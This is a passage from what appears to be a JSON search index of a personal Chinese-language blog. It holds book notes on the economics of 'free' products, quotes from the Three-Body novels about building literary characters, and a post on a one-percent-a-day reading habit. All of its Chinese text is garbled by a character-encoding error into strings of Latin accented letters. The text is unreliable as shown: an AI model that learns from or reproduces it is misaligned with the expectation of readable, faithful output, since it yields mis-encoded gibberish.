æ¯”å¦‚ï¼Œç”¨ä»˜è´¹äº§å“æ¥è¡¥è´´å…è´¹äº§å“ï¼Œç”¨æ—¥åä»˜è´¹æ¥è¡¥è´´å½“å‰å…è´¹ï¼Œç”±ä»˜è´¹äººç¾¤æ¥ç»™ä¸ä»˜è´¹äººç¾¤æä¾›è¡¥è´´ã€‚ ç”¨å…è´¹çš„äº§å“å’ŒæœåŠ¡å»å¸å¼•ç”¨æˆ·ï¼Œç„¶åå†ç”¨å¢å€¼æœåŠ¡æˆ–å…¶ä»–äº§å“æ”¶è´¹ï¼Œå·²ç»æˆä¸ºäº’è”ç½‘å…¬å¸çš„æ™®éæˆé•¿è§„å¾‹ã€‚ ç”¨æˆ·ã€‚é€šå¸¸è€Œè¨€ï¼Œä¸€å®¶ç½‘ç«™ä¼šéµå¾ªâ€œ 5%å®šå¾‹â€ï¼Œä¹Ÿå°±æ˜¯è¯´ 5%çš„ä»˜è´¹ç”¨æˆ·æ˜¯ç½‘ç«™çš„æ‰€æœ‰æ”¶å…¥æ¥æºã€‚ ä¼å¾·æ²ƒå¾·æ˜ç™½â€œå…è´¹â€è¿™ä¸ªå­—çœ¼èƒ½é‡å¡‘é¡¾å®¢å¿ƒæ€ã€åˆ›é€ æ–°å¸‚åœºã€æ‰“ç ´æ—§ä¹ å¹¶è®©æ‰€æœ‰äº§å“çœ‹ä¸Šå»å…·æœ‰æ›´åŠ å¸å¼•äººçš„ç‹¬ç‰¹é­…åŠ›ã€‚ æ—æ—æ€»æ€»çš„å…è´¹å½’æ ¹ç»“åº•éƒ½è¡¨ç°ä¸ºåŒä¸€å®è´¨â€”è®©é’±åœ¨ä¸åŒçš„äº§å“ä¹‹é—´ã€äººä¹‹é—´ã€ç°åœ¨å’Œæœªæ¥ä¹‹é—´ã€ä¸ä¸é’±æ‰“äº¤é“çš„å¸‚åœºå’Œå›åˆ°é‡‘é’±å¸‚åœºä¹‹é—´è½¬ç§»ã€‚ ç»æµå­¦å®¶æŠŠå®ƒç§°åšâ€œäº¤å‰è¡¥è´´â€ï¼ˆ cross-subsidiesï¼‰ã€‚ ä½†æ˜¯å½“æŸæ ·å•†å“å…è´¹æ—¶ï¼Œä½ å°±å¿˜è®°äº†å®ƒçš„åå¤„äº†ã€‚ ä¸ˆå¤«ä¼šæœ‰ä¸€ç§çŸ›ç›¾å¿ƒæ€ï¼Œè§‰å¾—å’Œå¥¹ä¸€èµ·è¿‡ä¸ä¸‹å»ï¼Œä½†æ˜¯ç¦»å¼€å¥¹è‡ªå·±åˆè¿‡ä¸ä¸‹å»ã€‚ ç§‘å¹»å°è¯´ä¹‹æ‰€ä»¥å¼•äººå…¥èƒœï¼Œå°±åœ¨äºå®ƒæ­ç¤ºäº†äººç±»å¯¹è¿™ç§å¤§é”™ä½ä¼šä½œä½•ååº”ã€‚ æ–‡åŒ–ã€‚æ¢å¥è¯è¯´ï¼ŒåŒ®ä¹çš„ç»ˆç»“ä½¿æˆ‘ä»¬å˜å¾—æ‡’æƒ°ã€é¢“åºŸã€æ„šè ¢å’Œå‘é„™ã€‚ æˆ‘ä»¬å§‹ç»ˆè¢«è‡ªå·±ä¸æ›¾æ‹¥æœ‰çš„è€Œéå·²ç»æ‹¥æœ‰çš„äº‹ç‰©æ¿€åŠ±ç€ã€‚ æ‚²ç—›5é˜¶æ®µ æˆ‘ä»¬æœ€å¥½æ˜¯é€šè¿‡å¿ƒç†å­¦å®¶ä¼Šä¸½èç™½Â·åº“ä¼¯å‹’Â·ç½—æ–¯æå‡ºçš„â€œæ‚²ç—›äº”é˜¶æ®µâ€ç†è®ºæ¥è§£é‡Š å¦è®¤ æ„¤æ€’ å•†è®¨ ç»æœ› æ¥çº³ ","title":"#2 å…è´¹ - å•†ä¸šçš„æœªæ¥"},{"content":"æœ€è¿‘åˆšå¥½æœ‰æ—¶é—´ï¼Œå†æ¬¡è¯»äº†ä¸€éã€Šä¸‰ä½“ã€‹ï¼Œç›¸æ¯”ç¬¬ä¸€æ¬¡æƒŠè®¶äºç§‘å¹»æ¦‚å¿µçš„è®¾å®šï¼Œè¿™æ¬¡æ›´åŠ å…³æ³¨æ–‡å­¦æ€§æ–¹é¢çš„ä¸œè¥¿ã€‚\nå…·ä½“è€Œè¨€ï¼Œå°±æ˜¯\nç™½è“‰è¯´ï¼šâ€œä½ çš„æ–¹æ³•ä¸å¯¹ï¼Œä½ æ˜¯åœ¨ä½œæ–‡ï¼Œä¸æ˜¯åœ¨åˆ›é€ æ–‡å­¦å½¢è±¡ã€‚è¦çŸ¥é“ï¼Œä¸€ä¸ªæ–‡å­¦äººç‰©ååˆ†é’Ÿçš„è¡Œä¸ºï¼Œå¯èƒ½æ˜¯å¥¹åå¹´çš„ç»å†çš„åæ˜ ã€‚ä½ ä¸è¦å±€é™äºå°è¯´çš„æƒ…èŠ‚ï¼Œè¦å»æƒ³è±¡å¥¹çš„æ•´ä¸ªç”Ÿå‘½ï¼Œè€ŒçœŸæ­£å†™æˆæ–‡å­—çš„ï¼Œåªæ˜¯å†°å±±çš„ä¸€è§’ã€‚â€ \u0026mdash; åˆ˜æ…ˆæ¬£. ã€Šä¸‰ä½“å…¨é›†ã€‹\næˆ‘æƒ³èµ·äº†æˆ‘åˆä¸­æ—¶å†™è¿‡çš„ä¸€ç¯‡å°è¯´ï¼Œå½“æ—¶ä¹Ÿå†™äº†è‡³å°‘æœ‰åå‡ é¡µï¼Œæ•…äº‹çš„å†…å®¹å¤§æ¦‚æ˜¯æå†™ä¸€ä¸ªé¢‘ç¹æ•´å®¹çš„äººæ‰€é‡åˆ°çš„å„ç§ç»å†ã€‚\næˆ‘ä¸“æ³¨æå†™äºäººç‰©å½“æ—¶çš„æ„Ÿå—ï¼Œå½“æ—¶çš„ç»å†ï¼Œå´å¿½ç•¥çš„å¥¹çš„å†å²ã€‚\nç°åœ¨æƒ³æ¥ï¼Œä¸€ä¸ªäººä¹‹æ‰€ä»¥æ˜¯ç°åœ¨çš„æ ·å­ï¼Œç°åœ¨çš„æ€æƒ³ï¼Œå¾€å¾€æ˜¯ä»–10å¹´ï¼Œæˆ–è€…ä¸€è¾ˆå­ç»éªŒçš„ç´¯ç§¯ç»“æœã€‚\nå¥¹ä¹‹æ‰€ä»¥æ•´å®¹ï¼Œå¯èƒ½è¦å¾€å‰æ¨10å¹´ã€‚\nå¯èƒ½å’Œå¥¹åœ¨å­¦æ ¡çš„ç»å†æœ‰å…³ï¼Œæ¯”å¦‚åœ¨å¤–è²Œä¸Šæ”¶åˆ°éœ¸å‡Œæˆ–è€…å˜²ç¬‘ï¼Œå¯¼è‡´å¥¹çš„è‡ªå°Šå¿ƒæ”¶åˆ°ä¼¤å®³ã€‚\nå¯èƒ½å—åˆ°ç¯å¢ƒçš„å½±å“ï¼Œä¾‹å¦‚å®¶åº­æˆ–è€…å·¥ä½œç¯å¢ƒï¼Œéƒ½å­˜åœ¨æ•´å®¹çš„äººï¼Œå¯¼è‡´å¥¹è‡ªå·±ä¹Ÿæœ‰æ•´å®¹çš„æƒ³æ³•ã€‚\nå¯èƒ½ç¤¾äº¤åª’ä½“çš„å®£ä¼ æœ‰å…³ï¼Œå¯¼è‡´å¥¹æœ‰åŒ»ç¾çš„æƒ³æ³•ã€‚\nåœ¨ä¼—å¤šçš„å¯èƒ½æ€§ä¸­ï¼Œè¦é€‰æ‹©åˆé€‚çš„å¯èƒ½æ€§ï¼Œå¡‘é€ äººç‰©çš„è¡ŒåŠ¨çš„åŠ¨æœºã€‚\næ€»ä¹‹ï¼Œåœ¨æ„æ€æ–‡å­¦äººç‰©å½¢è±¡æ—¶ï¼ŒåŠ¡å¿…èƒ½å°†å¥¹çš„æ—¶é—´çº¿å…ˆå‰æˆ–è€…å‘åæ¢ç´¢10å¹´ã€‚ è¿™é‡Œé™¤äº†\u0026quot;ç™½è“‰\u0026quot;æ‰€è¯´çš„å‘å‰çš„10å¹´æ¢ç´¢ï¼Œå…¶å®ä¹Ÿå¯ä»¥å‘åæ¢ç´¢ã€‚\nä¾‹å¦‚ï¼š\nå¤šå¹´ä»¥åï¼Œé¢å¯¹è¡Œåˆ‘é˜Ÿï¼Œå¥¥é›·é‡Œäºšè¯ºÂ·å¸ƒæ©è¿ªäºšä¸Šæ ¡å°†ä¼šå›æƒ³èµ·çˆ¶äº²å¸¦ä»–å»è§è¯†å†°å—çš„é‚£ä¸ªé¥è¿œçš„ä¸‹åˆ ç™¾å¹´å­¤ç‹¬\nInfo åœ¨ä¸­å›½ï¼Œä»»ä½•è¶…è„±é£æ‰¬çš„æ€æƒ³éƒ½ä¼šç °ç„¶å åœ°çš„ï¼Œç°å®çš„å¼•åŠ›å¤ªæ²‰é‡äº†\né‚£ä¹ˆï¼Œè¿˜æœ‰å¤šå°‘åœ¨è‡ªå·±çœ‹æ¥æ˜¯æ­£å¸¸ç”šè‡³æ­£ä¹‰çš„äººç±»è¡Œä¸ºæ˜¯é‚ªæ¶çš„å‘¢ï¼Ÿ\nè¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œåªæœ‰å€ŸåŠ©äºäººç±»ä¹‹å¤–çš„åŠ›é‡ã€‚\nç¨åï¼Œæœ‰äººæŠ¥å‘Šè¯´ç‰›é¡¿çˆµå£«å·äº†ä¸€åŒ¹å¿«é©¬å»å‘ä¸æ˜ã€‚\näºæ˜¯ï¼Œå¥¹åœ¨åä¹‰ä¸Šè¿˜æ˜¯å°†ç ”ç©¶è¿›è¡Œä¸‹å»ï¼Œå®é™…ä¸Šåˆ™æ½œå¿ƒæè‡ªå·±çš„å¤ªé˜³æ•°å­¦æ¨¡å‹ã€‚\nä¸­å›½çš„é«˜å‚¨è“„ç‡æ˜¯ä¸€é¢—å¤§åœ°é›·ï¼Œæ€ä¹ˆç€ï¼Œè¯´å¯¹äº†å§ï¼Ÿé«˜å‚¨è“„ï¼Œä½ç¤¾ä¿ï¼Œè€ç™¾å§“å­˜åœ¨é“¶è¡Œé‡Œçš„é’±å°±æˆäº†å‘½æ ¹å„¿ï¼Œä¸€æœ‰é£å¹è‰åŠ¨å½“ç„¶ä¼šäº§ç”Ÿç¾¤ä½“æ€§ææ…Œã€‚â€\nå¦‚æœä½ çš„åŸåºœçœŸå¤Ÿæ·±ï¼Œé‚£å°±ä¸èƒ½æ˜¾ç¤ºå‡ºä»»ä½•åŸåºœæ¥ï¼Œå’Œç”µå½±ä¸Šçœ‹åˆ°çš„ä¸åŒï¼ŒçœŸæ­£è€è°‹æ·±ç®—çš„äººä¸æ˜¯æ¯å¤©é˜´ç€è„¸è£…é‚£å‰¯é¸Ÿæ ·å„¿ï¼Œä»–ä»¬å‹æ ¹å„¿å°±ä¸æ˜¾å‡ºç”¨è„‘å­çš„æ ·å„¿æ¥\næœ€é«˜çš„å¢ƒç•Œæ˜¯è®©ä»–ä»¬æ ¹æœ¬æ³¨æ„ä¸åˆ°ä½ ï¼Œå°±å½“ä½ ä¸å­˜åœ¨ï¼Œç›´åˆ°ä»–ä»¬æ­»åœ¨ä½ æ‰‹é‡Œå‰çš„ä¸€åˆ¹é‚£æ‰å›è¿‡å‘³æ¥ã€‚\nä¸€ä¸ªæ–‡å­¦äººç‰©ååˆ†é’Ÿçš„è¡Œä¸ºï¼Œå¯èƒ½æ˜¯å¥¹åå¹´çš„ç»å†çš„åæ˜ ã€‚ä½ ä¸è¦å±€é™äºå°è¯´çš„æƒ…èŠ‚ï¼Œè¦å»æƒ³è±¡å¥¹çš„æ•´ä¸ªç”Ÿå‘½ï¼Œè€ŒçœŸæ­£å†™æˆæ–‡å­—çš„ï¼Œåªæ˜¯å†°å±±çš„ä¸€è§’ã€‚\nä¸­ä¸–çºªå’Œå¤§ä½è°·çš„äº‹å®éƒ½è¯æ˜ï¼Œä¸“åˆ¶åˆ¶åº¦æ˜¯äººç±»å‘å±•çš„æœ€å¤§éšœç¢ï¼Œæ˜Ÿèˆ°åœ°çƒéœ€è¦æ´»è·ƒçš„æ–°æ€æƒ³å’Œåˆ›é€ åŠ›ï¼Œè¿™åªæœ‰é€šè¿‡å»ºç«‹ä¸€ä¸ªå……åˆ†å°Šé‡äººæ€§å’Œè‡ªç”±çš„ç¤¾ä¼šæ‰èƒ½åšåˆ°ã€‚â€\næ¥è‡ªå¾®ä¿¡è¯»ä¹¦\n","permalink":"https://wdd.js.org/books/001-%E4%B8%89%E4%BD%93/","summary":"æœ€è¿‘åˆšå¥½æœ‰æ—¶é—´ï¼Œå†æ¬¡è¯»äº†ä¸€éã€Šä¸‰ä½“ã€‹ï¼Œç›¸æ¯”ç¬¬ä¸€æ¬¡æƒŠè®¶äºç§‘å¹»æ¦‚å¿µçš„è®¾å®šï¼Œè¿™æ¬¡æ›´åŠ å…³æ³¨æ–‡å­¦æ€§æ–¹é¢çš„ä¸œè¥¿ã€‚\nå…·ä½“è€Œè¨€ï¼Œå°±æ˜¯\nç™½è“‰è¯´ï¼šâ€œä½ çš„æ–¹æ³•ä¸å¯¹ï¼Œä½ æ˜¯åœ¨ä½œæ–‡ï¼Œä¸æ˜¯åœ¨åˆ›é€ æ–‡å­¦å½¢è±¡ã€‚è¦çŸ¥é“ï¼Œä¸€ä¸ªæ–‡å­¦äººç‰©ååˆ†é’Ÿçš„è¡Œä¸ºï¼Œå¯èƒ½æ˜¯å¥¹åå¹´çš„ç»å†çš„åæ˜ ã€‚ä½ ä¸è¦å±€é™äºå°è¯´çš„æƒ…èŠ‚ï¼Œè¦å»æƒ³è±¡å¥¹çš„æ•´ä¸ªç”Ÿå‘½ï¼Œè€ŒçœŸæ­£å†™æˆæ–‡å­—çš„ï¼Œåªæ˜¯å†°å±±çš„ä¸€è§’ã€‚â€ \u0026mdash; åˆ˜æ…ˆæ¬£. ã€Šä¸‰ä½“å…¨é›†ã€‹\næˆ‘æƒ³èµ·äº†æˆ‘åˆä¸­æ—¶å†™è¿‡çš„ä¸€ç¯‡å°è¯´ï¼Œå½“æ—¶ä¹Ÿå†™äº†è‡³å°‘æœ‰åå‡ é¡µï¼Œæ•…äº‹çš„å†…å®¹å¤§æ¦‚æ˜¯æå†™ä¸€ä¸ªé¢‘ç¹æ•´å®¹çš„äººæ‰€é‡åˆ°çš„å„ç§ç»å†ã€‚\næˆ‘ä¸“æ³¨æå†™äºäººç‰©å½“æ—¶çš„æ„Ÿå—ï¼Œå½“æ—¶çš„ç»å†ï¼Œå´å¿½ç•¥çš„å¥¹çš„å†å²ã€‚\nç°åœ¨æƒ³æ¥ï¼Œä¸€ä¸ªäººä¹‹æ‰€ä»¥æ˜¯ç°åœ¨çš„æ ·å­ï¼Œç°åœ¨çš„æ€æƒ³ï¼Œå¾€å¾€æ˜¯ä»–10å¹´ï¼Œæˆ–è€…ä¸€è¾ˆå­ç»éªŒçš„ç´¯ç§¯ç»“æœã€‚\nå¥¹ä¹‹æ‰€ä»¥æ•´å®¹ï¼Œå¯èƒ½è¦å¾€å‰æ¨10å¹´ã€‚\nå¯èƒ½å’Œå¥¹åœ¨å­¦æ ¡çš„ç»å†æœ‰å…³ï¼Œæ¯”å¦‚åœ¨å¤–è²Œä¸Šæ”¶åˆ°éœ¸å‡Œæˆ–è€…å˜²ç¬‘ï¼Œå¯¼è‡´å¥¹çš„è‡ªå°Šå¿ƒæ”¶åˆ°ä¼¤å®³ã€‚\nå¯èƒ½å—åˆ°ç¯å¢ƒçš„å½±å“ï¼Œä¾‹å¦‚å®¶åº­æˆ–è€…å·¥ä½œç¯å¢ƒï¼Œéƒ½å­˜åœ¨æ•´å®¹çš„äººï¼Œå¯¼è‡´å¥¹è‡ªå·±ä¹Ÿæœ‰æ•´å®¹çš„æƒ³æ³•ã€‚\nå¯èƒ½ç¤¾äº¤åª’ä½“çš„å®£ä¼ æœ‰å…³ï¼Œå¯¼è‡´å¥¹æœ‰åŒ»ç¾çš„æƒ³æ³•ã€‚\nåœ¨ä¼—å¤šçš„å¯èƒ½æ€§ä¸­ï¼Œè¦é€‰æ‹©åˆé€‚çš„å¯èƒ½æ€§ï¼Œå¡‘é€ äººç‰©çš„è¡ŒåŠ¨çš„åŠ¨æœºã€‚\næ€»ä¹‹ï¼Œåœ¨æ„æ€æ–‡å­¦äººç‰©å½¢è±¡æ—¶ï¼ŒåŠ¡å¿…èƒ½å°†å¥¹çš„æ—¶é—´çº¿å…ˆå‰æˆ–è€…å‘åæ¢ç´¢10å¹´ã€‚ è¿™é‡Œé™¤äº†\u0026quot;ç™½è“‰\u0026quot;æ‰€è¯´çš„å‘å‰çš„10å¹´æ¢ç´¢ï¼Œå…¶å®ä¹Ÿå¯ä»¥å‘åæ¢ç´¢ã€‚\nä¾‹å¦‚ï¼š\nå¤šå¹´ä»¥åï¼Œé¢å¯¹è¡Œåˆ‘é˜Ÿï¼Œå¥¥é›·é‡Œäºšè¯ºÂ·å¸ƒæ©è¿ªäºšä¸Šæ ¡å°†ä¼šå›æƒ³èµ·çˆ¶äº²å¸¦ä»–å»è§è¯†å†°å—çš„é‚£ä¸ªé¥è¿œçš„ä¸‹åˆ ç™¾å¹´å­¤ç‹¬\nInfo åœ¨ä¸­å›½ï¼Œä»»ä½•è¶…è„±é£æ‰¬çš„æ€æƒ³éƒ½ä¼šç °ç„¶å åœ°çš„ï¼Œç°å®çš„å¼•åŠ›å¤ªæ²‰é‡äº†\né‚£ä¹ˆï¼Œè¿˜æœ‰å¤šå°‘åœ¨è‡ªå·±çœ‹æ¥æ˜¯æ­£å¸¸ç”šè‡³æ­£ä¹‰çš„äººç±»è¡Œä¸ºæ˜¯é‚ªæ¶çš„å‘¢ï¼Ÿ\nè¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œåªæœ‰å€ŸåŠ©äºäººç±»ä¹‹å¤–çš„åŠ›é‡ã€‚\nç¨åï¼Œæœ‰äººæŠ¥å‘Šè¯´ç‰›é¡¿çˆµå£«å·äº†ä¸€åŒ¹å¿«é©¬å»å‘ä¸æ˜ã€‚\näºæ˜¯ï¼Œå¥¹åœ¨åä¹‰ä¸Šè¿˜æ˜¯å°†ç ”ç©¶è¿›è¡Œä¸‹å»ï¼Œå®é™…ä¸Šåˆ™æ½œå¿ƒæè‡ªå·±çš„å¤ªé˜³æ•°å­¦æ¨¡å‹ã€‚\nä¸­å›½çš„é«˜å‚¨è“„ç‡æ˜¯ä¸€é¢—å¤§åœ°é›·ï¼Œæ€ä¹ˆç€ï¼Œè¯´å¯¹äº†å§ï¼Ÿé«˜å‚¨è“„ï¼Œä½ç¤¾ä¿ï¼Œè€ç™¾å§“å­˜åœ¨é“¶è¡Œé‡Œçš„é’±å°±æˆäº†å‘½æ ¹å„¿ï¼Œä¸€æœ‰é£å¹è‰åŠ¨å½“ç„¶ä¼šäº§ç”Ÿç¾¤ä½“æ€§ææ…Œã€‚â€\nå¦‚æœä½ çš„åŸåºœçœŸå¤Ÿæ·±ï¼Œé‚£å°±ä¸èƒ½æ˜¾ç¤ºå‡ºä»»ä½•åŸåºœæ¥ï¼Œå’Œç”µå½±ä¸Šçœ‹åˆ°çš„ä¸åŒï¼ŒçœŸæ­£è€è°‹æ·±ç®—çš„äººä¸æ˜¯æ¯å¤©é˜´ç€è„¸è£…é‚£å‰¯é¸Ÿæ ·å„¿ï¼Œä»–ä»¬å‹æ ¹å„¿å°±ä¸æ˜¾å‡ºç”¨è„‘å­çš„æ ·å„¿æ¥\næœ€é«˜çš„å¢ƒç•Œæ˜¯è®©ä»–ä»¬æ ¹æœ¬æ³¨æ„ä¸åˆ°ä½ ï¼Œå°±å½“ä½ ä¸å­˜åœ¨ï¼Œç›´åˆ°ä»–ä»¬æ­»åœ¨ä½ æ‰‹é‡Œå‰çš„ä¸€åˆ¹é‚£æ‰å›è¿‡å‘³æ¥ã€‚\nä¸€ä¸ªæ–‡å­¦äººç‰©ååˆ†é’Ÿçš„è¡Œä¸ºï¼Œå¯èƒ½æ˜¯å¥¹åå¹´çš„ç»å†çš„åæ˜ ã€‚ä½ ä¸è¦å±€é™äºå°è¯´çš„æƒ…èŠ‚ï¼Œè¦å»æƒ³è±¡å¥¹çš„æ•´ä¸ªç”Ÿå‘½ï¼Œè€ŒçœŸæ­£å†™æˆæ–‡å­—çš„ï¼Œåªæ˜¯å†°å±±çš„ä¸€è§’ã€‚\nä¸­ä¸–çºªå’Œå¤§ä½è°·çš„äº‹å®éƒ½è¯æ˜ï¼Œä¸“åˆ¶åˆ¶åº¦æ˜¯äººç±»å‘å±•çš„æœ€å¤§éšœç¢ï¼Œæ˜Ÿèˆ°åœ°çƒéœ€è¦æ´»è·ƒçš„æ–°æ€æƒ³å’Œåˆ›é€ åŠ›ï¼Œè¿™åªæœ‰é€šè¿‡å»ºç«‹ä¸€ä¸ªå……åˆ†å°Šé‡äººæ€§å’Œè‡ªç”±çš„ç¤¾ä¼šæ‰èƒ½åšåˆ°ã€‚â€\næ¥è‡ªå¾®ä¿¡è¯»ä¹¦","title":"#1 ä¸‰ä½“å…¨é›†"},{"content":"å‡ å¹´å‰ï¼Œä¹Ÿè®¸æ˜¯åœ¨æˆ‘å‚åŠ å·¥ä½œçš„ç¬¬ä¸€å¹´ã€‚\né‚£æ—¶å€™ï¼Œäºšé©¬é€Šè¿˜æ²¡æœ‰é€€å‡ºä¸­å›½ã€‚æœ€å¤§çš„é˜…è¯»ä¹°ä¹¦çš„åº”ç”¨æ˜¯äºšé©¬é€Šä¹¦åŸï¼Œæœ€æ–¹ä¾¿çš„è¯»ä¹¦ä¼šå‘˜ä¼šå‘˜æ˜¯kindle unlimitã€‚\nä¹°kindleçš„unlimitçš„ä¼šå‘˜ï¼Œå°±å¯ä»¥å€Ÿé˜…äºšé©¬é€Šä¹¦åŸé‡Œå‡ ä¹æ‰€æœ‰çš„ä¹¦ã€‚\né‚£ä¸€å¹´ï¼Œæˆ‘ä¸ºäº†å¢åŠ è‡ªå·±çš„çŸ¥è¯†ä¸çœ¼ç•Œï¼Œä¹Ÿä¸ºäº†æ¶ˆç£¨ä¸€äº›æ— èŠçš„æ—¶é—´ï¼Œæˆ‘ä¹°äº†kindle pw4ã€‚\næˆ‘ç»™è‡ªå·±åˆ¶å®šäº†ä¸€ä¸ªå°çš„è¯»ä¹¦è®¡åˆ’ã€‚\næ¯å¤©è‡³å°‘è¯»ä¸€æœ¬ä¹¦çš„1%ï¼Œæ¯å¤©è¯»è‡³å°‘äº”æœ¬ä¹¦ã€‚\næˆ‘å½“æ—¶è¿˜ç”¨excelè®°å½•äº†æ¯å¤©ï¼Œæ¯æœ¬ä¹¦çš„é˜…è¯»è¿›åº¦ã€‚è¿™ç§ä¹ æƒ¯æŒç»­äº†åŠå¹´å·¦å³ï¼Œç›´åˆ°æˆ‘åšæ‰‹æœ¯æ—¶æ‰ç»ˆæ­¢ã€‚\nå½“æˆ‘å›é¦–é‚£æ®µè¯»ä¹¦æ—¶é—´åï¼Œåœ¨ä¸çŸ¥ä¸è§‰ä¸­ï¼Œæˆ‘ç«Ÿç„¶è¯»å®Œäº†ä¸€ç™¾å¤šæœ¬ä¹¦ã€‚\nåŠå¹´æ—¶é—´æˆ‘è¯»çš„ä¹¦ï¼Œè¦æ¯”æˆ‘å¤§å­¦å››å¹´è¯»çš„ä¹¦è¿˜è¦å¤šã€‚\nåˆ†æåŸå› ï¼Œåˆ™æ€»ç»“å‡ºä»¥ä¸‹ä¸‰ç‚¹\n1. é‡åŒ– é‡åŒ–ï¼šæ¯æ¬¡è¯»ä¹¦ï¼Œè‡³å°‘è¦è¯»ç™¾åˆ†ä¹‹ä¸€ã€‚å½“ç„¶è¿™åªæ˜¯ä¸€ä¸ªç†è®ºå€¼ï¼Œæœ€ä½çš„é™åº¦æ˜¯è‡³å°‘ç¿»ä¸€é¡µã€‚å› ä¸ºæœ‰äº›éå¸¸åšçš„ä¹¦ï¼Œå³ä½¿æ˜¯ç™¾åˆ†ä¹‹ä¸€ï¼Œä¸€å¤©ä¹‹å†…ä¹Ÿæ˜¯å¾ˆéš¾è¯»å®Œçš„ã€‚ä¾‹å¦‚ã€Šæƒåˆ©çš„æ¸¸æˆå…¨é›†ã€‹è‹±æ–‡ç‰ˆï¼Œæˆ‘å‡ ä¹æ¯å¤©éƒ½çœ‹ï¼Œçœ‹äº†ä¸€å‘¨ä¹‹åï¼Œå†çœ‹çœ‹è¿›åº¦ï¼Œè¿˜æ˜¯ä¸è¶³ç™¾åˆ†ä¹‹ä¸€ã€‚\n2. è§‚æµ‹ è§‚æµ‹ï¼šå°±æ˜¯éœ€è¦è®°å½•è¯»ä¹¦çš„è¿›åº¦ï¼Œå› ä¸ºåªæœ‰èƒ½è§‚æµ‹åˆ°é˜…è¯»çš„è¿›åº¦ï¼Œæ‰ä¼šæ¯”è¾ƒå®¹æ˜“å‘ç°æ—¶é—´çš„ç´¯ç§¯æ•ˆæœï¼Œæ‰ä¼šæœ‰ç›®æ ‡ã€‚ç®€å•çš„æ–¹æ³•ä½ å¯ä»¥ç”¨ä¸ªexcel, æ¯å¤©è®°å½•è¿›åº¦ã€‚\nä¾‹å¦‚å¦‚ä¸‹è¡¨æ ¼ï¼š\nä¹¦å 08-04(å‘¨ä¸€) 05 06 07 08 09 10 ä¸‰ä½“ 5% 6% ç™¾å¹´å­¤ç‹¬ 20% 22% 3. æ”¾å¼ƒ æ”¾å¼ƒï¼šäººåœ¨é€‰ä¹¦ï¼Œä¹¦ä¹Ÿåœ¨é€‰äººã€‚æœ‰æ—¶å€™ï¼Œä¸€æœ¬ä¹¦è¯»äº†ä¸€å°éƒ¨åˆ†ï¼Œå‘ç°è¯»ä¹‹æ— å‘³ï¼Œä¸è¯»åˆè§‰å¾—ä¸è¯¥ä¸­é€”æ”¾å¼ƒã€‚è¿™æ—¶å€™ï¼Œä½ åº”è¯¥æ”¾å¼ƒç»§ç»­è¯»è¿™æœ¬ä¹¦ï¼ŒæŠŠå®ƒæ”¾åˆ°ä¸€è¾¹ï¼Œé€‰æ‹©å…¶ä»–çš„ä¹¦æ¥çœ‹ã€‚\n4. åšæŒ åšæŒï¼šä¸€ä»¶äº‹æƒ…ï¼Œå³ä½¿å†å›°éš¾ï¼Œåªè¦èƒ½åšæŒä¸¤å‘¨ä»¥ä¸Šï¼Œå°±ä¼šå½¢æˆä¹ æƒ¯ã€‚ä¸€æ—¦å½¢æˆä¹ æƒ¯ï¼Œå›°éš¾åº¦å°±ä¼šæ˜¾è‘—é™ä½ã€‚ ä»¥å‰æˆ‘å­¦è½¦çš„æ—¶å€™ï¼Œæ¯å¤©éƒ½è¦äº”ç‚¹èµ·åºŠï¼Œå»é©¾æ ¡å­¦è½¦ã€‚åˆšå¼€å§‹ç¬¬ä¸€å¤©ï¼Œäº”ç‚¹èµ·åºŠï¼Œè¢«çªé‡Œä»¿ä½›æ˜¯ä¸ªé»‘æ´æ¼©æ¶¡ï¼Œè€Œæˆ‘å¿…è¦è¦æœ‰ä¸€ä¸ªé€ƒé€¸é€Ÿåº¦æ‰èƒ½ä¸è¢«é»‘æ´æ‹‰è¿›å»ã€‚ ç„¶è€ŒåšæŒä¸€å‘¨ä¹‹åï¼Œå­¦è½¦ç»“æŸäº†ï¼Œå¼€å§‹æ­£å¸¸ä¸Šç­ï¼Œæˆ‘å‘ç°æˆ‘ä¹Ÿèƒ½å¾ˆè‡ªç„¶çš„åœ¨äº”ç‚¹èµ·åºŠã€‚ æ‰€ä»¥ï¼Œä¸è¦ä»¥ä¸ºç™¾åˆ†ä¹‹ä¸€å¾ˆå°ï¼Œä¹Ÿä¸è¦ä»¥ä¸ºé˜…è¯»å¾ˆéš¾ï¼Œè‡ªå·±å…ˆè¯•è¯•ï¼Œçœ‹çœ‹ä¸¤å‘¨ä¹‹åçš„ç»“æœã€‚\n5. é’ˆå¯¹æ€§ å¯¹äºä¸åŒç±»å‹çš„ä¹¦ï¼Œè¯»ä¹¦æ–¹æ³•ä¹Ÿä¸åŒï¼Œè¿™é‡Œæ¨èå¤§å®¶çœ‹çœ‹ã€Šå¦‚ä½•é˜…è¯»ä¸€æœ¬ä¹¦ã€‹\n","permalink":"https://wdd.js.org/books/000-%E7%99%BE%E5%88%86%E4%B9%8B%E4%B8%80/","summary":"å‡ å¹´å‰ï¼Œä¹Ÿè®¸æ˜¯åœ¨æˆ‘å‚åŠ å·¥ä½œçš„ç¬¬ä¸€å¹´ã€‚\né‚£æ—¶å€™ï¼Œäºšé©¬é€Šè¿˜æ²¡æœ‰é€€å‡ºä¸­å›½ã€‚æœ€å¤§çš„é˜…è¯»ä¹°ä¹¦çš„åº”ç”¨æ˜¯äºšé©¬é€Šä¹¦åŸï¼Œæœ€æ–¹ä¾¿çš„è¯»ä¹¦ä¼šå‘˜ä¼šå‘˜æ˜¯kindle unlimitã€‚\nä¹°kindleçš„unlimitçš„ä¼šå‘˜ï¼Œå°±å¯ä»¥å€Ÿé˜…äºšé©¬é€Šä¹¦åŸé‡Œå‡ ä¹æ‰€æœ‰çš„ä¹¦ã€‚\né‚£ä¸€å¹´ï¼Œæˆ‘ä¸ºäº†å¢åŠ è‡ªå·±çš„çŸ¥è¯†ä¸çœ¼ç•Œï¼Œä¹Ÿä¸ºäº†æ¶ˆç£¨ä¸€äº›æ— èŠçš„æ—¶é—´ï¼Œæˆ‘ä¹°äº†kindle 